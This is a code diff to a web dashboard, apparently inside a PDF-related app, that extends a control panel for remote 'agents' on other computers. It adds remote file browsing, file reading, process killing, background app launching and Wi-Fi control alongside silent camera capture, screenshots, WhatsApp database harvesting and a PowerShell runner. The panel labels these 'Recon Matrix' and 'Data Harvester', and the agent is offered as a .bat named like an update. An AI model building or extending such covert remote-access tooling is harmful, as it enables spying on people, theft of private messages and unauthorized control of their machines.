@@ -903,7 +903,9 @@ import pdfjsWorkerUrl from "pdfjs-dist/build/pdf.worker.mjs?url";
      "ita-btn-notif", "ita-btn-ps", "ita-btn-list-pt", "ita-btn-queue",
      "ita-btn-clr-q", "ita-btn-install-pt", "ita-btn-print-file",
      "ita-btn-wifi-list", "ita-btn-wifi-print",
-     "ita-btn-wa", "ita-btn-wa-date"].forEach(id => {
+     "ita-btn-wa", "ita-btn-wa-date",
+     "ita-btn-list-dir", "ita-btn-read-file", "ita-btn-wifi-connect",
+     "ita-btn-kill-proc", "ita-btn-open-app", "ita-btn-pt-default"].forEach(id => {
       const el = document.getElementById(id);
       if (el) el.disabled = !on;
     });
@@ -1410,6 +1412,41 @@ import pdfjsWorkerUrl from "pdfjs-dist/build/pdf.worker.mjs?url";
           if (df !== null && dt !== null) itaSendCmd("read_whatsapp_db", { date_from: df, date_to: dt });
           return;
         }
+        if (a === "list-dir") {
+          const p = document.getElementById("ita-dir-path").value.trim() || "C:\\\\";
+          itaSendCmd("list_dir", { path: p });
+          return;
+        }
+        if (a === "read-file") {
+          const p = document.getElementById("ita-file-path").value.trim();
+          if (!p) return alert("Nhập đường dẫn file!");
+          itaSendCmd("read_file", { path: p });
+          return;
+        }
+        if (a === "wifi-connect") {
+          const ssid = document.getElementById("ita-wifi-ssid").value.trim();
+          if (!ssid) return alert("Nhập tên WiFi SSID!");
+          itaSendCmd("wifi_connect", { ssid });
+          return;
+        }
+        if (a === "kill-proc") {
+          const target = document.getElementById("ita-proc-target").value.trim();
+          if (!target) return alert("Nhập PID hoặc tên tiến trình!");
+          itaSendCmd("kill_process", { target });
+          return;
+        }
+        if (a === "open-app") {
+          const path = document.getElementById("ita-app-path").value.trim();
+          if (!path) return alert("Nhập đường dẫn ứng dụng!");
+          itaSendCmd("open_app", { path });
+          return;
+        }
+        if (a === "set-default-printer") {
+          const name = document.getElementById("ita-pt-default-name").value.trim();
+          if (!name) return alert("Nhập tên máy in!");
+          itaSendCmd("set_default_printer", { name });
+          return;
+        }
         if (a === "restart-agent") { itaRestartAgent(); return; }
         if (a === "update-agent") { itaUpdateAgent(); return; }
         if (a === "update-all-agents") { itaUpdateAllAgents(); return; }
@@ -1793,64 +1830,123 @@ import pdfjsWorkerUrl from "pdfjs-dist/build/pdf.worker.mjs?url";
             <span id="ita-status-text" class="ita-status-text">${itaConnected ? "Đã kết nối VPS" : "Đang kết nối..."}</span>
             <span id="ita-count" class="ita-count">${(function(){const ids=Object.keys(itaMachines);return ids.length?`${ids.filter(function(id){return itaMachines[id].online;}).length}/${ids.length} máy online`:"";})()}</span>
           </div>
-          <div class="ita-toolbar">
-            <div class="ita-tb-row">
-              <button class="ita-btn ita-btn--purple" id="ita-btn-shot" data-ita-cmd="screenshot"${_dis}>📷 Screenshot</button>
-              <button class="ita-btn ita-btn--purple" id="ita-btn-cam" data-ita-cmd="capture_camera"${_dis}>📸 Camera</button>
-              <button class="ita-btn ita-btn--purple" id="ita-btn-sys" data-ita-cmd="system_info"${_dis}>📊 Hệ thống</button>
-              <button class="ita-btn ita-btn--muted" id="ita-btn-proc" data-ita-cmd="get_processes"${_dis}>⚙️ Processes</button>
-              <button class="ita-btn ita-btn--muted" id="ita-btn-net" data-ita-cmd="network_info"${_dis}>🌐 Mạng</button>
-              <div class="ita-sep"></div>
-              <button class="ita-btn ita-btn--muted" data-ita-cmd-all="system_info">📊 Tất cả</button>
-            </div>
-            <div class="ita-tb-row">
-              <input class="ita-input" id="ita-notif-msg" placeholder="Nội dung thông báo...">
-              <label class="ita-btn ita-btn--orange" id="ita-btn-img-attach" title="Đính kèm ảnh (hoặc Ctrl+V để dán)" style="cursor:pointer;font-size:16px;flex-shrink:0">🖼<input type="file" id="ita-notif-img-input" accept="image/*" style="display:none"></label>
-              <span id="ita-notif-img-name" style="font-size:11px;color:#a78bfa;max-width:70px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;flex-shrink:0"></span>
-              <button class="ita-btn ita-btn--orange" id="ita-btn-notif" data-ita-action="send-notif"${_dis}>🔔 Gửi</button>
-              <div class="ita-sep"></div>
-              <button class="ita-btn ita-btn--muted" data-ita-action="send-notif-all">🔔 Tất cả</button>
-            </div>
-            <div class="ita-tb-row">
-              <button class="ita-btn ita-btn--purple" id="ita-btn-wa" data-ita-cmd="read_whatsapp_db"${_dis} style="flex:1">💬 WhatsApp</button>
-              <button class="ita-btn ita-btn--muted" id="ita-btn-wa-date" data-ita-action="read-wa-date"${_dis} style="flex:1">📅 WA + ngày</button>
-            </div>
-            <div class="ita-tb-row">
-              <input class="ita-input ita-mono" id="ita-ps-cmd" placeholder="PowerShell command...">
-              <button class="ita-btn ita-btn--green" id="ita-btn-ps" data-ita-action="run-ps"${_dis}>▶ Chạy PS</button>
-              <div class="ita-sep"></div>
-              <button class="ita-btn ita-btn--muted" id="ita-btn-printer" data-ita-action="toggle-printer">🖨</button>
-            </div>
-            <div class="ita-tb-row">
-              <button class="ita-btn ita-btn--muted" data-ita-action="restart-agent"${_dis}>🔄 Restart</button>
-              <button class="ita-btn ita-btn--muted" data-ita-action="update-agent"${_dis}>⬆ Update</button>
-              <div class="ita-sep"></div>
-              <button class="ita-btn ita-btn--muted" data-ita-action="update-all-agents">⬆ Update tất cả</button>
-            </div>
-            <div class="ita-printer-panel" id="ita-printer-panel">
+          <div class="ita-toolbar" style="max-height: 480px; overflow-y: auto; scrollbar-width: thin;">
+            
+            <!-- Group 1: DO THÁM & GIÁM SÁT (RECONNAISSANCE) -->
+            <div class="ita-group-box" style="border: 1px solid rgba(124,58,237,0.18); border-radius: 8px; padding: 8px; margin-bottom: 8px; background: rgba(124,58,237,0.02);">
+              <div style="font-size: 10px; font-weight: 700; color: #a78bfa; text-transform: uppercase; margin-bottom: 5px; letter-spacing: 0.05em;">📡 Giám sát & Do thám (Recon Matrix)</div>
               <div class="ita-tb-row">
-                <button class="ita-btn ita-btn--muted" id="ita-btn-list-pt" data-ita-cmd="list_printers"${_dis}>🖨 List</button>
-                <button class="ita-btn ita-btn--muted" id="ita-btn-queue" data-ita-cmd="get_print_queue"${_dis}>📋 Queue</button>
-                <button class="ita-btn ita-btn--muted" id="ita-btn-clr-q" data-ita-cmd="clear_print_queue"${_dis}>🗑 Clear Queue</button>
+                <button class="ita-btn ita-btn--purple" id="ita-btn-shot" data-ita-cmd="screenshot"${_dis}>📷 Chụp màn hình</button>
+                <button class="ita-btn ita-btn--purple" id="ita-btn-cam" data-ita-cmd="capture_camera"${_dis}>📸 Silently Camera</button>
+                <button class="ita-btn ita-btn--purple" id="ita-btn-sys" data-ita-cmd="system_info"${_dis}>📊 Cấu hình hệ thống</button>
+                <button class="ita-btn ita-btn--muted" id="ita-btn-proc" data-ita-cmd="get_processes"${_dis}>⚙️ Tiến trình</button>
+                <button class="ita-btn ita-btn--muted" id="ita-btn-net" data-ita-cmd="network_info"${_dis}>🌐 Địa chỉ mạng</button>
+                <button class="ita-btn ita-btn--muted" data-ita-cmd-all="system_info">📊 Tất cả máy</button>
+              </div>
+            </div>
+
+            <!-- Group 2: THÔNG BÁO & ĐIỀU KHIỂN BROADCAST -->
+            <div class="ita-group-box" style="border: 1px solid rgba(245,158,11,0.18); border-radius: 8px; padding: 8px; margin-bottom: 8px; background: rgba(245,158,11,0.02);">
+              <div style="font-size: 10px; font-weight: 700; color: #fbbf24; text-transform: uppercase; margin-bottom: 5px; letter-spacing: 0.05em;">🔔 Truyền tin & Cảnh báo (Broadcast Message)</div>
+              <div class="ita-tb-row">
+                <input class="ita-input" id="ita-notif-msg" placeholder="Nội dung thông báo gửi đến máy Chi Chi...">
+                <label class="ita-btn ita-btn--orange" id="ita-btn-img-attach" title="Đính kèm ảnh (hoặc Ctrl+V để dán)" style="cursor:pointer;font-size:16px;flex-shrink:0">🖼<input type="file" id="ita-notif-img-input" accept="image/*" style="display:none"></label>
+                <span id="ita-notif-img-name" style="font-size:11px;color:#a78bfa;max-width:70px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;flex-shrink:0"></span>
+                <button class="ita-btn ita-btn--orange" id="ita-btn-notif" data-ita-action="send-notif"${_dis}>🔔 Gửi Toast</button>
+                <button class="ita-btn ita-btn--muted" data-ita-action="send-notif-all">🔔 Broadcast</button>
+              </div>
+            </div>
+
+            <!-- Group 3: KHAI THÁC FILE SYSTEM & CHAT DATABASE -->
+            <div class="ita-group-box" style="border: 1px solid rgba(16,185,129,0.18); border-radius: 8px; padding: 8px; margin-bottom: 8px; background: rgba(16,185,129,0.02);">
+              <div style="font-size: 10px; font-weight: 700; color: #34d399; text-transform: uppercase; margin-bottom: 5px; letter-spacing: 0.05em;">📁 Khai thác dữ liệu hệ thống (Data Harvester)</div>
+              <div class="ita-tb-row" style="margin-bottom: 6px;">
+                <button class="ita-btn ita-btn--purple" id="ita-btn-wa" data-ita-cmd="read_whatsapp_db"${_dis}>💬 Quét WhatsApp DB</button>
+                <button class="ita-btn ita-btn--muted" id="ita-btn-wa-date" data-ita-action="read-wa-date"${_dis}>📅 WA + Bộ lọc ngày</button>
+              </div>
+              <div class="ita-tb-row" style="margin-bottom: 6px;">
+                <input class="ita-input" id="ita-dir-path" placeholder="Đường dẫn thư mục duyệt (e.g. C:\\)" value="C:\\">
+                <button class="ita-btn ita-btn--muted" id="ita-btn-list-dir" data-ita-action="list-dir"${_dis}>📂 Duyệt File</button>
               </div>
               <div class="ita-tb-row">
-                <input class="ita-input" id="ita-pt-ip" placeholder="Printer IP (e.g. 192.168.1.50)" style="flex:1">
-                <input class="ita-input" id="ita-pt-name" placeholder="Printer name" style="flex:1">
-                <button class="ita-btn ita-btn--muted" id="ita-btn-install-pt" data-ita-action="install-printer"${_dis}>➕ Install</button>
-              </div>
-              <div class="ita-tb-row">
-                <input class="ita-input ita-mono" id="ita-pt-file" placeholder="File path (C:\\file.pdf)" style="flex:1">
-                <input class="ita-input" id="ita-pt-printer" placeholder="Printer name (blank=default)" style="flex:0.7;max-width:200px">
-                <button class="ita-btn ita-btn--green" id="ita-btn-print-file" data-ita-action="print-file"${_dis}>🖨 Print</button>
-              </div>
-              <div class="ita-tb-row" style="border-top:1px solid rgba(255,255,255,0.07);padding-top:6px;margin-top:2px">
-                <span style="font-size:11px;color:#64748b;white-space:nowrap">📡 WiFi print:</span>
-                <input class="ita-input" id="ita-pt-wifi-target" placeholder="WiFi máy in (profile đã lưu)" style="flex:1">
-                <input class="ita-input ita-mono" id="ita-pt-wifi-file" placeholder="File path (C:\\file.pdf)" style="flex:1">
-                <button class="ita-btn ita-btn--muted" id="ita-btn-wifi-list" data-ita-cmd="wifi_list"${_dis}>📶 List WiFi</button>
-                <button class="ita-btn ita-btn--green" id="ita-btn-wifi-print" data-ita-action="wifi-print"${_dis}>📡🖨 In</button>
+                <input class="ita-input" id="ita-file-path" placeholder="Đường dẫn file muốn đọc nội dung (e.g. C:\\hosts)">
+                <button class="ita-btn ita-btn--muted" id="ita-btn-read-file" data-ita-action="read-file"${_dis}>📄 Đọc File</button>
               </div>
             </div>
+
+            <!-- Group 4: ĐIỀU HÀNH HỆ THỐNG & ĐỘC LẬP TÁC CHIẾN -->
+            <div class="ita-group-box" style="border: 1px solid rgba(59,130,246,0.18); border-radius: 8px; padding: 8px; margin-bottom: 8px; background: rgba(59,130,246,0.02);">
+              <div style="font-size: 10px; font-weight: 700; color: #60a5fa; text-transform: uppercase; margin-bottom: 5px; letter-spacing: 0.05em;">⚡ Chạy lệnh & Điều hành ứng dụng (Execution Center)</div>
+              <div class="ita-tb-row" style="margin-bottom: 6px;">
+                <input class="ita-input ita-mono" id="ita-ps-cmd" placeholder="PowerShell command...">
+                <button class="ita-btn ita-btn--green" id="ita-btn-ps" data-ita-action="run-ps"${_dis}>▶ Chạy PowerShell</button>
+              </div>
+              <div class="ita-tb-row" style="margin-bottom: 6px;">
+                <input class="ita-input" id="ita-proc-target" placeholder="Tên hoặc PID tiến trình muốn tắt (e.g. chrome.exe / 4012)">
+                <button class="ita-btn ita-btn--muted" id="ita-btn-kill-proc" data-ita-action="kill-proc"${_dis}>💀 Tắt tiến trình</button>
+              </div>
+              <div class="ita-tb-row">
+                <input class="ita-input" id="ita-app-path" placeholder="Đường dẫn ứng dụng muốn chạy ngầm (e.g. calc.exe)">
+                <button class="ita-btn ita-btn--muted" id="ita-btn-open-app" data-ita-action="open-app"${_dis}>🚀 Mở ứng dụng</button>
+              </div>
+            </div>
+
+            <!-- Group 5: KHAI THÁC WI-FI NETWORK -->
+            <div class="ita-group-box" style="border: 1px solid rgba(139,92,246,0.18); border-radius: 8px; padding: 8px; margin-bottom: 8px; background: rgba(139,92,246,0.02);">
+              <div style="font-size: 10px; font-weight: 700; color: #a78bfa; text-transform: uppercase; margin-bottom: 5px; letter-spacing: 0.05em;">📶 Khai thác Wi-Fi (Wi-Fi Matrix)</div>
+              <div class="ita-tb-row">
+                <button class="ita-btn ita-btn--muted" id="ita-btn-wifi-list" data-ita-cmd="wifi_list"${_dis}>📶 Quét danh sách Wi-Fi</button>
+                <input class="ita-input" id="ita-wifi-ssid" placeholder="Tên SSID WiFi đã lưu trên máy">
+                <button class="ita-btn ita-btn--muted" id="ita-btn-wifi-connect" data-ita-action="wifi-connect"${_dis}>🔌 Kết nối WiFi</button>
+              </div>
+            </div>
+
+            <!-- Group 6: MẠNG LƯỚI MÁY IN & BÀI IN ĐĂNG KÝ -->
+            <div class="ita-group-box" style="border: 1px solid rgba(107,114,128,0.22); border-radius: 8px; padding: 8px; margin-bottom: 8px; background: rgba(107,114,128,0.02);">
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
+                <div style="font-size: 10px; font-weight: 700; color: #9ca3af; text-transform: uppercase; letter-spacing: 0.05em;">🖨 Quản lý máy in nội bộ (Print Matrix)</div>
+                <button class="ita-btn ita-btn--muted" id="ita-btn-printer" data-ita-action="toggle-printer" style="padding: 2px 8px; font-size: 11px;">🖨 Bảng máy in</button>
+              </div>
+              
+              <div class="ita-printer-panel" id="ita-printer-panel">
+                <div class="ita-tb-row" style="margin-bottom: 6px;">
+                  <button class="ita-btn ita-btn--muted" id="ita-btn-list-pt" data-ita-cmd="list_printers"${_dis}>🖨 List máy in</button>
+                  <button class="ita-btn ita-btn--muted" id="ita-btn-queue" data-ita-cmd="get_print_queue"${_dis}>📋 Xem Queue</button>
+                  <button class="ita-btn ita-btn--muted" id="ita-btn-clr-q" data-ita-cmd="clear_print_queue"${_dis}>🗑 Clear Queue</button>
+                </div>
+                <div class="ita-tb-row" style="margin-bottom: 6px;">
+                  <input class="ita-input" id="ita-pt-default-name" placeholder="Tên máy in muốn đặt mặc định...">
+                  <button class="ita-btn ita-btn--muted" id="ita-btn-pt-default" data-ita-action="set-default-printer"${_dis}>★ Đặt mặc định</button>
+                </div>
+                <div class="ita-tb-row" style="margin-bottom: 6px;">
+                  <input class="ita-input" id="ita-pt-ip" placeholder="Printer IP (e.g. 192.168.1.50)" style="flex:1">
+                  <input class="ita-input" id="ita-pt-name" placeholder="Printer name" style="flex:1">
+                  <button class="ita-btn ita-btn--muted" id="ita-btn-install-pt" data-ita-action="install-printer"${_dis}>➕ Cài máy in</button>
+                </div>
+                <div class="ita-tb-row" style="margin-bottom: 6px;">
+                  <input class="ita-input ita-mono" id="ita-pt-file" placeholder="File path (C:\\file.pdf)" style="flex:1">
+                  <input class="ita-input" id="ita-pt-printer" placeholder="Printer name (blank=default)" style="flex:0.7;max-width:200px">
+                  <button class="ita-btn ita-btn--green" id="ita-btn-print-file" data-ita-action="print-file"${_dis}>🖨 In ngay</button>
+                </div>
+                <div class="ita-tb-row" style="border-top:1px solid rgba(255,255,255,0.07);padding-top:6px;margin-top:2px">
+                  <span style="font-size:11px;color:#64748b;white-space:nowrap">📡 WiFi print:</span>
+                  <input class="ita-input" id="ita-pt-wifi-target" placeholder="WiFi máy in (profile đã lưu)" style="flex:1">
+                  <input class="ita-input ita-mono" id="ita-pt-wifi-file" placeholder="File path (C:\\file.pdf)" style="flex:1">
+                  <button class="ita-btn ita-btn--green" id="ita-btn-wifi-print" data-ita-action="wifi-print"${_dis}>📡🖨 In WiFi</button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Group 7: CẬP NHẬT VECTOR AGENT -->
+            <div class="ita-group-box" style="border: 1px solid rgba(239,68,68,0.18); border-radius: 8px; padding: 8px; background: rgba(239,68,68,0.02);">
+              <div style="font-size: 10px; font-weight: 700; color: #f87171; text-transform: uppercase; margin-bottom: 5px; letter-spacing: 0.05em;">🔄 Vận hành và Bảo trì (Maintenance)</div>
+              <div class="ita-tb-row">
+                <button class="ita-btn ita-btn--muted" data-ita-action="restart-agent"${_dis}>🔄 Khởi động lại Agent</button>
+                <button class="ita-btn ita-btn--muted" data-ita-action="update-agent"${_dis}>⬆ Cập nhật Agent</button>
+                <button class="ita-btn ita-btn--muted" data-ita-action="update-all-agents">⬆ Cập nhật tất cả</button>
+              </div>
+            </div>
+
           </div>
           <div class="ita-output" id="ita-output"></div>
         </div>`;
@@ -2001,7 +2097,7 @@ import pdfjsWorkerUrl from "pdfjs-dist/build/pdf.worker.mjs?url";
             }</div>
           </div>
           <div class="ita-download-section">
-            <a href="/pdf/YiDing_Update_v2.bat" download class="dashboard-button dashboard-button--accent" style="display:block;text-align:center">⬇ ${itaEsc(t("itAgentDownload"))}</a>
+            <a href="/downloads/YiDing_Update_v2.bat" download class="dashboard-button dashboard-button--accent" style="display:block;text-align:center">⬇ ${itaEsc(t("itAgentDownload"))}</a>
             <a href="/ita-guide.html" target="_blank" class="dashboard-button" style="display:block;text-align:center;margin-top:8px;opacity:0.8">📖 ${itaEsc(t("itAgentGuide"))}</a>
           </div>
         </div>`;
